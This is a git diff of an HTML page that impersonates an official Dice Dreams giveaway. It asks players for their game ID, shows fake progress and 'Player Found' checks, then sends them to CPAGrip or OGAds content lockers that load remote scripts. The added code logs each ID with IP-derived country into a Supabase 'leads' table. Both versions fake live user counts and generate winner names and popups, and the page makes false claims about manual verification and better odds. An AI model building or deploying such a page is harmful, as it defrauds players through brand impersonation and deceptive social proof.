@@ -3,123 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dice Dreams - New Year Reward Hub</title>
+    <title>Dice Dreams - Official Community Giveaway Event</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
-    <link rel="icon" href="https://www.superplay.co/wp-content/uploads/2025/04/dd-new-logo-e1744638762437.png" type="image/x-icon">
+    <link rel="icon" href="./dd-new-logo-e1744638762437.png" type="image/x-icon">
     
-    <!-- [NEW] FITUR 1: KONFIGURASI TERPUSAT -->
     <script src="/config.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <!-- [MASTER FIX] HYBRID LOCKER LOADER -->
+    <script type="text/javascript">
+        var urlParams = new URLSearchParams(window.location.search);
+        var subID = urlParams.get('s1') || 'Owner';
+        var isTeam = false;
+        var lck = false; // Wajib untuk CPAGrip
+    
+        if (subID !== 'Owner' && typeof teamConfig !== 'undefined' && teamConfig[subID]) {
+            isTeam = true;
+        }
+    
+        if (isTeam) {
+            // MODE TIM (OGAds)
+            console.log("Loading OGAds...");
+            var script = document.createElement('script');
+            script.type = 'text/javascript';
+            script.id = 'ogjs';
+            script.src = 'https://verify.zhwifi.web.id/cl/js/4oowg4'; 
+            document.head.appendChild(script);
+        } else {
+            // MODE OWNER (CPAGrip)
+            console.log("Loading CPAGrip...");
+            document.write('<script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1864025"><\/script>');
+        }
+    </script>
 
     <style>
         :root { --primary: #006ce5; --accent: #ffcc00; --gold: #f1c40f; --bg-dark: #001220; }
         body { margin: 0; font-family: 'Poppins', sans-serif; color: #fff; background: var(--bg-dark); overflow-x: hidden; }
-        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(0, 108, 229, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(123, 107, 255, 0.2), transparent 50%), linear-gradient(180deg, #000a1a 0%, #001220 100%); }
-        
-        .header { width: 100%; height: 70px; background: rgba(0, 0, 0, 0.9); display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--accent); position: fixed; top: 0; z-index: 1000; }
+        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(0, 108, 229, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.2), transparent 50%), linear-gradient(180deg, #024188 0%, #006ce5 100%); }
+        .header { width: 100%; height: 70px; background: #006ce5; display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--accent); position: fixed; top: 0; z-index: 1000; }
         .header-content { display: flex; align-items: center; gap: 15px; }
         .header img { height: 40px; }
         .publisher-separator { width: 1px; height: 25px; background: rgba(255, 255, 255, 0.3); }
-        .publisher-logo { height: 20px !important; filter: grayscale(1) brightness(2); opacity: 0.8; }
-
+        .publisher-logo { height: 35px !important; }
         .container { display: flex; max-width: 1100px; margin: 100px auto 40px; gap: 20px; padding: 0 15px; flex-wrap: wrap; }
         .main-content { flex: 1; min-width: 300px; text-align: center; }
         .card-panel { background: rgba(255, 255, 255, 0.98); border-radius: 25px; padding: 25px; color: #333; border: 3px solid var(--gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        
         .hero-icon { width: 100px; margin: 10px auto; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 15px var(--primary)); }
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-
-        /* [NEW] FITUR 2: ONLINE & NOTIF STYLING */
         .online-counter { display: inline-flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 15px; border-radius: 999px; margin-bottom: 15px; border: 1px solid rgba(39,174,96,0.5); }
         .dot-live { width: 8px; height: 8px; background: #27ae60; border-radius: 50%; box-shadow: 0 0 8px #27ae60; animation: pulseLive 2s infinite; }
         @keyframes pulseLive { 0% { transform: scale(0.9); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }
-
         .tg-notif { position: fixed; bottom: -100px; left: 20px; background: #fff; color: #333; padding: 12px 18px; border-radius: 15px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); z-index: 9999; border-left: 5px solid #24A1DE; }
         .tg-notif img { width: 40px; border-radius: 50%; }
         .tg-notif-text { font-size: 11px; line-height: 1.4; text-align: left; }
-
         .sidebar { width: 280px; background: #fff; border-radius: 20px; padding: 20px; color: #333; height: fit-content; border: 1px solid #ddd; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
         @media (max-width: 850px) { .sidebar { display: none; } .container { justify-content: center; } }
         .stat-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
         .winner-item { background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 8px; font-size: 11px; text-align: left; border-left: 4px solid var(--primary); }
-
         h1 { color: var(--primary); text-transform: uppercase; font-size: 20px; font-weight: 800; }
         input[type="text"] { width: 85%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }
-        .btn-main { background: linear-gradient(180deg, #00c3ff 0%, #006ce5 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }
-
+        .btn-main { background: linear-gradient(180deg, #006ce5 0%, #02346d 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }
         .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
         .reward-item { background: #f1f5f9; border: 2px solid #eee; border-radius: 15px; padding: 12px; cursor: pointer; color: #333; font-weight: bold; }
-        .reward-item.active { border-color: var(--primary); background: #e0f2ff; transform: scale(1.03); }
-        .reward-item img { width: 55px; display: block; margin: 0 auto 5px; }
-
+        .reward-item.active { border-color: var(--primary); background: #fff1f0; transform: scale(1.03); }
+        .reward-item img { width: 40px; display: block; margin: 0 auto 5px; }
         .progress-container { width: 100%; background: #eee; height: 18px; border-radius: 10px; margin: 15px 0; overflow: hidden; }
-        .progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; }
+        .progress-bar { height: 100%; background: var(--primary); width: 0%; }
         .trust-badge { margin: 5px 0 15px; display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 11px; color: #27ae60; font-weight: 600; }
+        /* Social & Disclaimer */
+        .admin-note {
+            background: rgba(255, 243, 205, 0.6);
+            border: 1px solid #ffeeba;
+            color: #856404;
+            font-size: 11px;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 15px;
+            text-align: left;
+            line-height: 1.4;
+        }
+        .social-box {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(0,0,0,0.1);
+        }
+        .social-title { font-size: 11px; color: #666; margin-bottom: 8px; display: block; }
+        .social-icons { display: flex; justify-content: center; gap: 15px; }
+        .s-icon {
+            width: 40px; height: 40px;
+            background: #eee; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            text-decoration: none; transition: 0.3s;
+        }
+        .s-icon img { width: 30px; height: 30px; margin: 0 !important; }
+        .s-icon:hover { transform: translateY(-3px); box-shadow: 0 5px 10px rgba(0,0,0,0.2); }
+        /* Security Note Style */
+        .security-note { font-size: 11px; background: #fff5f5; color: #d32f2f; padding: 10px; border-radius: 10px; border: 1px dashed #d32f2f; margin-bottom: 15px; line-height: 1.4; }
     </style>
-    <script type="text/javascript">var lck = false;</script>
-    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1863960"></script>
-    <script type="text/javascript">if(!lck){top.location = 'https://playabledownload.com/help/ablk.php?lkt=1'; }</script>
 </head>
 <body>
+
 <div class="aurora-bg"></div>
+
 <div class="header">
     <div class="header-content">
-        <img src="https://www.superplay.co/wp-content/uploads/2025/04/dd-new-logo-e1744638762437.png" alt="Dice Dreams">
+        <img src="./dd-new-logo-e1744638762437.png" alt="Dice Dreams">
         <div class="publisher-separator"></div>
-        <img src="https://www.superplay.co/wp-content/uploads/2025/02/logo.svg" class="publisher-logo" alt="SuperPlay">
+        <img src="./logo.svg" class="publisher-logo" alt="SuperPlay">
     </div>
 </div>
+
 <div class="container">
     <div class="main-content">
         <div class="card-panel">
+            
+            <!-- STEP 1 -->
             <div id="step1">
                 <img src="./1747281394834_01.png" class="hero-icon">
-                <h1>Claim New Year Gifts</h1>
+                <h1>Community Giveaway Event</h1>
+                <p style="font-size: 13px; color: #aaa; margin-bottom: 20px;">
+                  Join our exclusive weekly event! Enter your valid Game ID to participate in the raffle.<br>
+                <!-- [NEW] SECURITY DISCLAIMER -->
+                <div class="security-note">
+                    🛡️ <b>Security Protocol:</b> We will NEVER ask for your password or credit card. Only your Player ID is required to check reward eligibility.
+                </div>
+                  <span style="color: #4caf50;">✔ No Password Required</span>
+                </p>
                 
-                <!-- [NEW] FITUR 3: ONLINE COUNTER -->
                 <div class="online-counter">
                     <div class="dot-live"></div>
-                    <span style="font-size: 12px; color: #fff;">Live: <b id="user-count">1,452</b> Dreaming Online</span>
+                    <span style="font-size: 12px; color: #fff;">Live: <b id="user-count">1,452</b> Users Online</span>
                 </div>
-
-                <div class="trust-badge"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Official Security Verified</div>
-                <input type="text" id="uid" placeholder="Your Dice Dreams ID...">
-                <button onclick="startProcess()" class="btn-main">Verify ID</button>
+                <div class="trust-badge">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    Official Security Verified
+                </div>
+                <input type="text" id="uid" placeholder="Enter Valid User ID (For Verification)">
+                
+                <!-- TOMBOL UTAMA -->
+                <button onclick="startProcess()" class="btn-main">Check Eligibility</button>
+                
+                <div style="margin-top: 10px; font-size: 10px; color: #f44336; font-style: italic;">
+                  *Entering invalid ID will disqualify you from the reward system.
+                </div>
             </div>
+
+            <!-- STEP 2: PROCESSING -->
             <div id="step-process" style="display:none">
                 <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                <h2 id="counter" style="color:#333">0%</h2>
+                <h2 id="counter" style="color:#333">Searching...</h2>
                 <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
-                <p id="msg" style="color:#777">Syncing rewards...</p>
+                <p id="msg" style="color:#777">Connecting to <b id="username"></b> Account...</p>
             </div>
+
+            <!-- STEP 3: SELECTION -->
             <div id="step-select" style="display:none">
-                <h1>Select Reward Package</h1>
+                <span>Hi <b id="usernamer"></b>, Congratulations 👏🎉</span>
+                <h1>Select Your Rolls Package</h1>
                 <div class="reward-grid">
-                    <div class="reward-item active" onclick="selectR(this, 1500)"><img src="./spin-coin-master.png">1,500 Coins</div>
-                    <div class="reward-item" onclick="selectR(this, 3200)"><img src="./spin-coin-master.png">3,200 Coins</div>
+                    <div class="reward-item active" onclick="selectR(this, 1500)"><img src="./spin-master.png">1,500 Rolls</div>
+                    <div class="reward-item" onclick="selectR(this, 3200)"><img src="./spin-master.png">3,200 Rolls</div>
                     <div class="reward-item" onclick="selectR(this, 5500)"><img src="./spin-master.png">5,500 Rolls</div>
                     <div class="reward-item" onclick="selectR(this, 8000)"><img src="./spin-master.png">8,000 Rolls</div>
                 </div>
                 <button onclick="confirmReward()" class="btn-main">Claim Selection</button>
             </div>
+
+            <!-- STEP 4: VERIFY -->
             <div id="step-verify" style="display:none">
-                <h1 style="color:var(--primary)">Final Step!</h1>
-                <p style="color:#333">Hi <b id="user-display"></b>, complete verification to receive your reward.</p>
-                <button onclick="call_locker_smart();" class="btn-main">Verify Now</button>
+                <h1 style="color:var(--primary)">Final Step Required!</h1>
+                <div style="background: #f0f7ff; padding: 10px; border-radius: 10px; border: 1px solid #2196f3; margin-bottom: 15px;">
+                    <p style="color:#333; font-size: 13px; line-height: 1.5;">
+                        Player Found: <b id="user-display" style="font-size: 16px; color: #000;"></b> <span style="color:green">✔</span>
+                        <br><br>
+                        To officially enter the Giveaway List and claim <b><span id="final-amt"></span> Rolls</b>, please complete one verification task below.
+                    </p>
+                </div>
+                <p style="font-size: 11px; color: #666; margin-bottom: 10px;">
+                    <i>*Completing the offer increases your winning chance by 80%.</i>
+                </p>
+                <button onclick="call_locker_smart();" class="btn-main">Complete &amp; Join Giveaway</button>
+            </div>
+            <!-- MANUAL CHECK NOTICE -->
+            <div class="admin-note">
+                👮‍♂️ <b>Admin Notice:</b> Verification is required. I personally verify every ID by installing the game to ensure the giveaway goes to real players, not bots.
+            </div>
+            
+            <!-- SOCIAL CHANNELS -->
+            <div class="social-box">
+                <span class="social-title">Join Community for Winner Announcement:</span>
+                <div class="social-icons">
+                    <!-- Ganti # dengan Link Grup/Channel kamu -->
+                    <a href="https://www.facebook.com/profile.php?id=61586039304119" class="s-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB"></a>
+                    <a href="https://t.me/zhstore_gaming" class="s-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG"></a>
+                    <a href="https://whatsapp.com/channel/0029Vb7bd2OAYlUNpMFnnI1J" class="s-icon"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA"></a>
+                </div>
             </div>
         </div>
     </div>
+
+    <!-- SIDEBAR -->
     <div class="sidebar">
         <h4 style="margin-top:0; color:var(--primary)">Server Info</h4>
         <div class="stat-row"><span>Status:</span><span style="color:green; font-weight:bold;">ONLINE</span></div>
         <div class="stat-row"><span>Last Update:</span><span id="date"></span></div>
         <hr>
         <h4 style="color:var(--primary)">Recent Success</h4>
-        <!-- [NEW] FITUR 4: DYNAMIC SIDEBAR -->
         <div id="sidebar-rewards"></div>
     </div>
 </div>
 
-<!-- [NEW] FITUR 5: POPUP NOTIF -->
+<!-- TELEGRAM POPUP -->
 <div id="tg-notif" class="tg-notif">
     <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png" alt="bot">
     <div class="tg-notif-text">
@@ -128,85 +223,228 @@
     </div>
 </div>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
-    // --- [NEW] UNIVERSAL CONFIG ---
-    const MY_REWARD_NAME = "Rolls/Coins"; 
-    const MY_GAME_ID = "DiceDreams";
+    // =========================================
+    // 1. CONFIG (Bagian ini BOLEH diedit)
+    // =========================================
+    const MY_REWARD_NAME = "Rolls"; 
+    const MY_GAME_ID = "Dice Dreams";
+    const SB_URL = 'https://rtuzlitxkguvyzjfolwz.supabase.co';
+    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ0dXpsaXR4a2d1dnl6amZvbHd6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjcxNjg4MDMsImV4cCI6MjA4Mjc0NDgwM30.i_bhDn2dOOvEyXd_ruu6scvneVPKoi8m8fh-mEydEQU';
 
-    let user_id = ""; let amount = 1500;
-    function selectR(el, amt) { $(".reward-item").removeClass("active"); $(el).addClass("active"); amount = amt; }
-    function startProcess() { user_id = $("#uid").val(); if(user_id.length < 3) return alert("Enter ID"); $("#step1").hide(); $("#step-process").show(); setTimeout(() => { $("#step-process").hide(); $("#step-select").show(); }, 2000); }
-    function confirmReward() { $("#step-select").hide(); $("#step-process").show(); $("#msg").text("Syncing with database..."); let c = 0; let iv = setInterval(() => { c += 2; if(c >= 100) { clearInterval(iv); $("#step-process").hide(); $("#user-display").text(user_id); $("#step-verify").show(); } $("#counter").text(c + "%"); $("#p-bar").css("width", c+"%"); }, 40); }
-
-    // FUNGSI DINAMIS CPAGRIP (SMART TRACKING - DUAL KEY)
-    function call_locker_smart() {
-        var urlParams = new URLSearchParams(window.location.search);
-        var subID = urlParams.get('s1') || 'Owner'; 
+    // =========================================
+    // 2. LOGIKA DATABASE (TERPISAH TOTAL)
+    // =========================================
+    // --- [UPDATE] FUNGSI DATABASE PRO (ANTI-DUPLIKAT & NEGARA) ---
+    async function savePlayerToDB(uid) {
+        if (typeof supabase === 'undefined') return;
         
-        // Ganti MY_GAME_ID sesuai folder (MLBB/DiceDreams/FreeFire)
-        var gameName = typeof MY_GAME_ID !== 'undefined' ? MY_GAME_ID : 'Unknown';
-    
-        if (typeof call_locker === 'function') {
-            call_locker({
-                s1: subID,          // Key standar
-                tracking_id: subID, // Key simulator
-                s2: gameName        // Nama Game
-            });
-        } else {
-            // Fallback jika script telat load
-            alert("System busy, please try again in a few seconds.");
+        // 1. Ambil nama asli (hanya buang spasi di awal/akhir)
+        const originalUid = uid.trim(); 
+        const _db = supabase.createClient(SB_URL, SB_KEY);
+        
+        try {
+            // 2. CEK DUPLIKAT SECARA PINTAR (Tidak peduli besar/kecil huruf)
+            // .ilike() adalah fungsi PostgreSQL untuk mencari tanpa membedakan casing
+            const { data: existing } = await _db
+                .from('leads')
+                .select('game_uid')
+                .ilike('game_uid', originalUid) // <--- PENCARIAN PINTAR
+                .eq('game_name', MY_GAME_ID)
+                .limit(1);
+
+            if (existing && existing.length > 0) {
+                console.log("ID ini sudah terdaftar sebelumnya.");
+                return; 
+            }
+
+            // 3. DETEKSI NEGARA
+            let countryName = "Unknown";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const ipData = await res.json();
+                countryName = ipData.country_name + " (" + ipData.country_code + ")";
+            } catch (e) {}
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const subID = urlParams.get('s1') || 'Owner';
+
+            // 4. SIMPAN NAMA ASLI KE DATABASE
+            await _db.from('leads').insert([{ 
+                game_uid: originalUid, // <--- DISIMPAN SESUAI KETIKAN USER
+                game_name: MY_GAME_ID,
+                source_code: subID,
+                status: 'Pending',
+                country: countryName
+            }]);
+            
+            console.log("Data " + originalUid + " berhasil dicatat.");
+
+        } catch (e) {
+            console.log("DB Error Skip");
         }
     }
 
-    // [NEW] LOGIKA BOOSTER
-    const fakeNames = ["James_R", "Sarah.M", "Emma_W", "John88", "David.C", "Linda_K", "Robert_S", "Michael_B", "Daniel_US", "Sophie_UK"];
-    const fakeLocs = ["🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇩🇪 Germany", "🇦🇺 Australia", "🇫🇷 France"];
-    const baseAmounts = [1500, 3200, 5500, 8000];
+    // =========================================
+    // 3. LOGIKA UI (PRIORITAS UTAMA)
+    // =========================================
+    let user_id = ""; 
+    let amount = 1500;
 
-    let currentUsers = Math.floor(Math.random() * (2500 - 1200 + 1)) + 1200;
-    function updateOnline() {
-        currentUsers += Math.floor(Math.random() * 7) - 3;
-        document.getElementById('user-count').innerText = currentUsers.toLocaleString();
-        setTimeout(updateOnline, 4000);
+    function selectR(el, amt) {
+        $(".reward-item").removeClass("active");
+        $(el).addClass("active"); 
+        amount = amt; 
     }
-    updateOnline();
 
-    function updateSidebar() {
-        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)] + Math.floor(Math.random() * 99);
-        let html = `<div class="winner-item">User <b>${name}</b> claimed ${amt.toLocaleString()} Rewards<br><small>Just now</small></div>`;
-        $("#sidebar-rewards").prepend(html);
-        if($("#sidebar-rewards .winner-item").length > 4) $("#sidebar-rewards .winner-item:last").remove();
-        setTimeout(updateSidebar, 6000);
+    // Tombol ini MURNI Javascript, tanpa jQuery, jadi pasti jalan
+    function startProcess() {
+        var inputVal = document.getElementById("uid").value;
+        if(inputVal.length < 3) {
+            alert("Please enter your REAL User ID to join the raffle.");
+            return;
+        }
+        user_id = inputVal;
+
+        // Tampilkan UI Loading
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step-process").style.display = "block";
+        document.getElementById("username").innerText = user_id;
+
+        // Simpan Data di Background
+        savePlayerToDB(user_id);
+
+        // Pindah ke step pilih Rolls
+        setTimeout(function() {
+            $("#step-process").hide();
+            $("#step-select").show();
+            $("#usernamer").text(user_id);
+        }, 3500);
     }
-    updateSidebar();
 
-    function showRewardNotif() {
-        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-        let loc = fakeLocs[Math.floor(Math.random() * fakeLocs.length)];
-        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)] + Math.floor(Math.random() * 99);
-        $("#tg-user").text(name + " · " + loc);
-        $("#tg-reward").text(amt.toLocaleString() + " Rewards");
-        $("#tg-notif").css("bottom", "20px");
-        setTimeout(() => { $("#tg-notif").css("bottom", "-100px"); }, 4500);
-        setTimeout(showRewardNotif, 12000);
+    function confirmReward() {
+        $("#step-select").hide();
+        $("#step-process").show();
+        $("#msg").text("Syncing with database...");
+        
+        let c = 0;
+        let iv = setInterval(() => {
+            c += 4; 
+            if(c >= 100) {
+                clearInterval(iv);
+                $("#step-process").hide();
+                $("#user-display").html(user_id + " <span style='color:green; font-size:11px;'>(Verified)</span>");
+                $("#final-amt").text(amount.toLocaleString());
+                $("#step-verify").show();
+            }
+            $("#counter").text(c + "%");
+            $("#p-bar").css("width", c+"%");
+        }, 350);
     }
-    setTimeout(showRewardNotif, 5000);
 
-    document.getElementById("date").innerHTML = new Date().getDate() + "/" + (new Date().getMonth()+1);
+    function call_locker_smart() {
+        // [NEW] SIMPAN DATA SESI (Agar bisa masuk success.html)
+        sessionStorage.setItem("cpa_user_id", user_id);
+        sessionStorage.setItem("cpa_status", "processing");
+
+        // Ambil data terbaru dari URL saat tombol diklik (Biar akurat)
+        var urlParams = new URLSearchParams(window.location.search);
+        var subID = urlParams.get('s1') || 'Owner'; 
+
+        // LOGIKA PEMISAHAN (SPLIT LOGIC)
+        if (isTeam) {
+            // --- JALUR OGADS (TIM) ---
+            if (typeof og_load === 'function') {
+                console.log("Memicu OGAds untuk: " + subID);
+                
+                // PENTING: Gunakan key 'aff_sub4' agar cocok dengan Postback URL {aff_sub4}
+                og_load({
+                    aff_sub4: subID,      // ID Anggota (Mjolnir)
+                    aff_sub5: MY_GAME_ID  // Nama Game (Dice Dreams)
+                }); 
+            } else {
+                alert("OGAds Locker is loading... Please wait 3 seconds.");
+            }
+        } else {
+            // --- JALUR CPAGRIP (OWNER) ---
+            if (typeof call_locker === 'function') {
+                console.log("Memicu CPAGrip untuk: " + subID);
+                call_locker(); 
+            } else {
+                alert("CPAGrip Locker is loading... Please wait or disable AdBlock.");
+            }
+        }
+    }
+
+    // =========================================
+    // 4. FITUR TAMBAHAN (NOTIF & COUNTER)
+    // =========================================
+    // Gunakan window.onload agar semua elemen siap
+    window.onload = function() {
+        // Fake Data
+        const fakeNames = ["James_R", "Sarah.M", "Emma_W", "John88", "David.C", "Linda_K", "Robert_S"];
+        const fakeLocs = ["🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇩🇪 Germany", "🇦🇺 Australia", "🇫🇷 France"];
+
+        // 1. Online Counter
+        function updateOnline() {
+            let num = 1200 + Math.floor(Math.random() * 500);
+            if(document.getElementById("user-count")) document.getElementById("user-count").innerText = num.toLocaleString();
+            setTimeout(updateOnline, 4000);
+        }
+        updateOnline();
+
+        // 2. Sidebar & Popup (Pake jQuery check)
+        function loopFake() {
+            if (typeof $ === 'undefined') return; // Safety check
+            
+            let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+            let loc = fakeLocs[Math.floor(Math.random() * fakeLocs.length)];
+            let amt = 1500 + Math.floor(Math.random() * 8000);
+
+            // Sidebar
+            let html = `<div class="winner-item">User <b>${name}</b> claimed ${amt.toLocaleString()} ${MY_REWARD_NAME}<br><small>Just now</small></div>`;
+            $("#sidebar-rewards").prepend(html);
+            if($("#sidebar-rewards .winner-item").length > 4) $("#sidebar-rewards .winner-item:last").remove();
+
+            // Popup
+            $("#tg-user").text(name + " · " + loc);
+            $("#tg-reward").text(amt.toLocaleString() + " " + MY_REWARD_NAME);
+            $("#tg-notif").css("bottom", "20px");
+            setTimeout(() => { $("#tg-notif").css("bottom", "-100px"); }, 4000);
+
+            setTimeout(loopFake, 8000);
+        }
+        setTimeout(loopFake, 3000);
+        
+        // Date
+        if(document.getElementById("date")) document.getElementById("date").innerHTML = new Date().getDate() + "/" + (new Date().getMonth()+1);
+    };
 </script>
 
-<!-- [NEW] FITUR 6: SMART HISTATS -->
+<!-- HISTATS -->
 <script type="text/javascript">
-    var urlParams = new URLSearchParams(window.location.search); var subID = urlParams.get('s1') || 'Owner';
-    var activeHistatsID = teamConfig[subID] || teamConfig['Owner'];
-    var _Hasync= _Hasync|| []; _Hasync.push(['Histats.start', '1,' + activeHistatsID + ',4,0,0,0,00010000']);
-    _Hasync.push(['Histats.fasi', '1']); _Hasync.push(['Histats.track_hits', '']);
-    _Hasync.push(['Histats.custom_variable', ['Game', MY_GAME_ID]]);
+    var urlParams = new URLSearchParams(window.location.search);
+    var subID = urlParams.get('s1') || 'Owner';
+    var activeID = '4999292'; 
+
+    if (typeof teamConfig !== 'undefined') {
+        activeID = teamConfig[subID] || teamConfig['Owner'] || activeID;
+    }
+
+    var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,' + activeID + ',4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    _Hasync.push(['Histats.custom_variable', ['Game', 'DiceDreams']]); // Hardcoded biar aman
     _Hasync.push(['Histats.custom_variable', ['Member', subID]]);
-    (function() { var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true; hs.src = ('//s10.histats.com/js15_as.js'); (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs); })();
+
+    (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
 </script>
+
 <style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
